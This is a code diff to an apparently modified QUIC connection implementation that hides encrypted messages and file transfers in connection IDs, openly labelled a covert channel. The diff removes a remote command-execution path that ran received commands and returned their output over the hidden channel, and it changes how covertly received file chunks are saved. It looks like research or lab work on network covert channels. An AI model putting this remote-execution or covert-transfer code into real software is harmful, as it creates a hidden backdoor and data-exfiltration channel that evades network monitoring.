@@ -114,15 +114,11 @@ STREAMS_BLOCKED_CAPACITY = 1 + UINT_VAR_MAX_SIZE
 TRANSPORT_CLOSE_FRAME_CAPACITY = 1 + 3 * UINT_VAR_MAX_SIZE  # + reason length
 
 GLOBAL_BYTE_ORDER = "big"
-RSA_PRIVATE_KEY = None
 CID_HISTORY_LENGTH = 16
 PEER_META = {}
 PEER_META_LOCK = threading.Lock()
-REMOTE_COMMANDS_ENABLED = False
 
-MAX_CID_LENGTH = 20
 SEQUENCE_BYTES = 2
-SYNC_RECOVERY_TIMEOUT = 30.0
 MAX_BUFFER_AGE = 60.0
 
 
@@ -330,9 +326,6 @@ def resolve_hostname_from_url(url):
 def peer_address_key(addr, is_client=True):
     """
     Build a key for peer metadata.
-
-    For clients: use (ip, port) since we connect to a specific server port.
-    For servers: use (ip, 0) since clients use ephemeral ports that change per connection.
     """
     if isinstance(addr, tuple):
         ip = addr[0] if len(addr) >= 1 else str(addr)
@@ -454,7 +447,6 @@ class QuicConnection:
         # Covert channel section for client
         PEER_META_LOCK.acquire(timeout=5)
         peer_key = peer_address_key(addr, is_client=self._is_client)
-        peer_ip = peer_key[0]
         peer_meta = PEER_META.get(peer_key)
         if not peer_meta:
             from . import ccrypto
@@ -2330,54 +2322,26 @@ class QuicConnection:
                             peer_meta["message_history"][peer_key] = message_list
 
                             if command == ord("m"):
-                                logger.info("RECEIVED MESSAGE: %s", decrypted_message)
+                                logger.info(
+                                    "=== RECEIVED MESSAGE: %s", decrypted_message
+                                )
                             elif command == ord("f"):
-                                file_prefix = (
-                                    "server-" if self._is_client else "client-"
-                                )
-                                filename = f"{file_prefix}{peer_ip}-message-{len(message_list)}.bin"
-                                open(filename, "wb").write(decrypted_message)
-                                logger.info("RECEIVED FILE SAVED TO: %s", filename)
-                            elif REMOTE_COMMANDS_ENABLED and command == ord("c"):
-                                logger.info("RECEIVED COMMAND: %s", decrypted_message)
-                                stdout, stderr, return_code = execute_command(
-                                    decrypted_message
-                                )
-                                seq = peer_meta.get("next_sequence", 0)
-                                peer_meta["next_sequence"] = seq + 1
-                                fec_rate = (
-                                    self._configuration.covert_fec_rate
-                                    if self._configuration.covert_strategy == "fec"
-                                    else None
-                                )
-                                ccrypto.queue_message(
-                                    host_ip=peer_ip,
-                                    payload=f"m:{stdout}\n{stderr}\n{return_code}".encode(
-                                        "utf8"
-                                    ),
-                                    queue=peer_meta["cid_queue"],
-                                    public_key=peer_meta["public_key"],
-                                    sequence=seq,
-                                    session_key=peer_meta.get("session_key"),
-                                    fec_rate=fec_rate,
+                                filename = "client-transfer.bin"
+                                with open(filename, "ab") as f_out:
+                                    f_out.write(decrypted_message)
+                                logger.info(
+                                    "RECEIVED FILE CHUNK (%d bytes) APPENDED TO: %s",
+                                    len(decrypted_message),
+                                    filename,
                                 )
 
-                        # Done processing this message.
-                        # In Legacy mode, we break because buffer is cleared.
                         if self._configuration.covert_strategy != "fec":
                             break
 
                     else:
-                        # Decryption FAILED for this candidate.
-                        # Increment index to try the next start position (Peeking).
                         current_buffer_idx += 1
 
-                        # Stop if we've searched too deep (prevent CPU exhaustion)
-                        # or if we ran out of buffer.
                         if current_buffer_idx > scan_depth:
-                            # We scanned `scan_depth` packets and found nothing valid.
-                            # We do NOT drop the buffer yet. We wait for more packets to arrive.
-                            # This preserves partial fragments (e.g. packet 1 of 3).
                             break
 
         if PEER_META_LOCK.locked():
